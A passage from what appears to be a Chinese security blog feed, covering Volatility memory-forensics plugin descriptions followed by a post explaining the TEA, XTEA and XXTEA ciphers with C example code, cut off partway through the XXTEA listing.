title="consoles"></a><code>consoles</code></h4><p><strong>：该插件和cmdscan类似，区别在于cmdscan是通过扫描COMMAND_HISTORY，而且只能打印攻击者输入的命令，而consoles是通过扫描CONSOLE_INFORMARION，而且不仅可以打印输入的命令，还能收集整个屏幕缓冲区，比如不止能看到命令，还可以看到攻击者看到了什么，比如dir命令列出的所有文件和目录等等操作</strong></p><h4 id="privs"><a href="#privs" class="headerlink" title="privs"></a><code>privs</code></h4><p><strong>：显示哪些进程权限默认存在、启用或默认启用</strong></p><h4 id="envars"><a href="#envars" class="headerlink" title="envars"></a><code>envars</code></h4><p><strong>：显示进程的环境变量</strong></p><h4 id="verinfo"><a href="#verinfo" class="headerlink" title="verinfo"></a><code>verinfo</code></h4><p><strong>：显示PE文件中嵌入的版本信息</strong></p><h4 id="enumfunc"><a href="#enumfunc" class="headerlink" title="enumfunc"></a><code>enumfunc</code></h4><p><strong>：枚举进程，dll和内核驱动程序它们的导入导出函数</strong></p><h3 id="进程内存相关"><a href="#进程内存相关" class="headerlink" title="进程内存相关"></a>进程内存相关</h3><h4 id="memmap"><a href="#memmap" class="headerlink" title="memmap"></a><code>memmap</code></h4><p><strong>：给定进程特定的DTB，memmap可以显示出驻留在内存的page，即显示页面的虚拟地址，页面的相应物理偏移量和页面的大小</strong></p><h4 id="memdump"><a href="#memdump" class="headerlink" title="memdump"></a><code>memdump</code></h4><p><strong>：将内存中所有的驻留页面转储到单个文件中</strong></p><h4 id="procdum"><a href="#procdum" class="headerlink" title="procdum"></a><code>procdum</code></h4><p><strong>：转储进程的可执行文件</strong></p><h4 id="vadinfo"><a href="#vadinfo" class="headerlink" title="vadinfo"></a><code>vadinfo</code></h4><p><strong>：显示关于进程的VAD(Virtual Address Descriptor，虚拟地址描述符)节点的扩展信息</strong></p><h4 id="vadwalk"><a href="#vadwalk" class="headerlink" title="vadwalk"></a><code>vadwalk</code></h4><p><strong>：以表格形式检查进程的VAD节点</strong></p><h4 id="vadtree"><a href="#vadtree" class="headerlink" title="vadtree"></a><code>vadtree</code></h4><p><strong>：以树的形式显示VAD节点</strong></p><h4 id="vaddump"><a href="#vaddump" class="headerlink" title="vaddump"></a><code>vaddump</code></h4><p><strong>：提取用VAD节点描述的页面，和memdump类似，区别在于属于每个VAD节点的页面被放置到单独的文件中(根据开始和结束地址命名)，而不是像memdump，dump出一个大的集成文件</strong></p><h4 id="evtlogs"><a href="#evtlogs" class="headerlink" title="evtlogs"></a><code>evtlogs</code></h4><p><strong>：从内存中提取并解析二进制事件文件(event log)，适用于XP和2003</strong></p><h4 id="iehistory"><a href="#iehistory" class="headerlink" title="iehistory"></a><code>iehistory</code></h4><p><strong>：<font color="red">查看系统浏览器的浏览记录</font>；恢复ie历史记录index.dat缓存的文件。可以找到基本的访问链接(通过FTP和HTTP)，重定向链接和已经删除的条目。适用于任何加载和使用wininet.dll库的任何进程，不仅仅限于Internet Explore</strong></p><h3 id="核心内存和对象相关"><a href="#核心内存和对象相关" class="headerlink" title="核心内存和对象相关"></a>核心内存和对象相关</h3><h4 id="modules"><a href="#modules" class="headerlink" title="modules"></a><code>modules</code></h4><p><strong>：查看系统上加载的内核驱动程序列表，它通过遍历PsLoadedModuleList指向的LDR_DATA_TABLE_ENTRY结构的双向链表。类似于pslist。但是它找不到隐藏/未链接的内核驱动程序，但modscan可以</strong></p><h4 id="modscan"><a href="#modscan" class="headerlink" title="modscan"></a><code>modscan</code></h4><p><strong>：通过池标签扫描来查找LDR_DATA_TABLE_ENTRY结构，可以找到以前卸载的驱动程序和已经被rootkit隐藏/解链的驱动程序</strong></p><h4 id="moddump"><a href="#moddump" class="headerlink" title="moddump"></a><code>moddump</code></h4><p><strong>：将内核驱动程序提取到文件</strong></p><h4 id="ssdt"><a href="#ssdt" class="headerlink" title="ssdt"></a><code>ssdt</code></h4><p><strong>：列出Native和GUI SSDT中的函数，它能显示SSDT中的每个条目的索引</strong></p><h4 id="driverscan"><a href="#driverscan" class="headerlink" title="driverscan"></a><code>driverscan</code></h4><p><strong>：使用池标签扫描在物理内存中查找DRIVER_OBJECT，这是查找内核模块的另一个方法，但不是每个内核模块都有DRIVER_OBJECT</strong></p><h4 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a><code>filescan</code></h4><p><strong>：扫描所有的文件列表；使用池标签扫描在物理内存中查找FILE_OBJECT，这样一来即使rookit将文件隐藏在磁盘上，并且rootkit hook了某些API函数来隐藏系统上打开的句柄，该插件还是可以找到rootkit打开的文件</strong></p><h4 id="mutantscan"><a href="#mutantscan" class="headerlink" title="mutantscan"></a><code>mutantscan</code></h4><p><strong>：使用池标签扫描在物理内存中查找KMUTANT对象</strong></p><h4 id="symlinkscan"><a href="#symlinkscan" class="headerlink" title="symlinkscan"></a><code>symlinkscan</code></h4><p><strong>：扫描符号链接对象(symbolic link objects)并输出其信息</strong></p><h4 id="thrdscan"><a href="#thrdscan" class="headerlink" title="thrdscan"></a><code>thrdscan</code></h4><p><strong>：使用池标签扫描在物理内存中查找ETHREAD对象，可以用来找到隐藏的进程</strong></p><h4 id="dumpfiles"><a href="#dumpfiles" class="headerlink" title="dumpfiles"></a><code>dumpfiles</code></h4><p><strong>：遍历VAD并提取所有映射为DataSectionObject，ImageSectionObject或SharedCacheMap文件</strong></p><ul><li><pre><code class="bash">vol.py -f [image] --profile=[profile] dumpfiles -Q 0xaddr -D ./-Q指定偏移量 0xaddr-D指定目录 ./</code></pre></li></ul><h4 id="unloadedmodules"><a href="#unloadedmodules" class="headerlink" title="unloadedmodules"></a><code>unloadedmodules</code></h4><p><strong>：Windows会存储最近卸载的驱动程序的信息以供调试，该模块可以看出系统上到底发生了什么</strong></p><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><h4 id="connections"><a href="#connections" class="headerlink" title="connections"></a><code>connections</code></h4><p><strong>：获取内存中处于活动状态的TCP连接</strong></p><h4 id="connscan"><a href="#connscan" class="headerlink" title="connscan"></a><code>connscan</code></h4><p><strong>：使用池标签扫描查找_TCPT_OBJECT结构，它可以找到除了活动连接以外，已经终止的链接</strong></p><h4 id="sockets"><a href="#sockets" class="headerlink" title="sockets"></a><code>sockets</code></h4><p><strong>：检测任何协议(TCP, UDP, RAW等)的侦听套接字(listening sockets)</strong></p><h4 id="sockscan"><a href="#sockscan" class="headerlink" title="sockscan"></a><code>sockscan</code></h4><p><strong>：使用池标签扫描查找_ADDERSS_OBJECT结构，类似connscan，可以从先前的socket中提取残留的数据等</strong></p><h4 id="netscan"><a href="#netscan" class="headerlink" title="netscan"></a><code>netscan</code></h4><p><strong>：在内存转储中扫描网络，它将查找TCP端点、TCP侦听器、UDP端点和UDP侦听器，可以获取系统IP</strong></p>]]></content>
      
      
      <categories>
          
          <category> 内存取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> volatility </tag>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEA</title>
      <link href="/2023/04/21/tea/"/>
      <url>/2023/04/21/tea/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="TEA算法简介"><a href="#TEA算法简介" class="headerlink" title="TEA算法简介"></a>TEA算法简介</h1><p>TEA算法是一种分组密码算法，其明文密文块为64比特，密钥长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。</p><p>TEA采用移位和异或操作，所以加密解密算法形式非常相似</p><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token comment">//加密函数</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data0 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data1 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>                data0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> data0<span class="token punctuation">;</span>        data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//解密函数</span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data0 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data1 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>        sum <span class="token operator">=</span> delta <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                data1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> data0<span class="token punctuation">;</span>        data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后原始数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h1><p>XTEA是TEA的扩展，也称做TEAN，它使用与TEA相同的简单运算，同样是一个64位块的Feistel密码，使用128位密钥，建议64轮, 但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击；</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token comment">//加密函数</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data0 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data1 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                data0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data1<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>                data1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data0<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">&gt;&gt;</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> data0<span class="token punctuation">;</span>        data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//解密函数</span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data0 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data1 <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        sum <span class="token operator">=</span> delta <span class="token operator">*</span> num_rounds<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                data1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>data0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data0<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">&gt;&gt;</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>                data0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>data1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>data1<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> data0<span class="token punctuation">;</span>        data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后原始数据：%u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h1><p>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">delta</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">&gt;&gt;</span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">//加密算法</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        z <span class="token operator">=</span> data<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>                sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>                e <span class="token operator">=</span> <span class="token punctuation">(</span>sum<span class="token operator">&gt;&gt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span 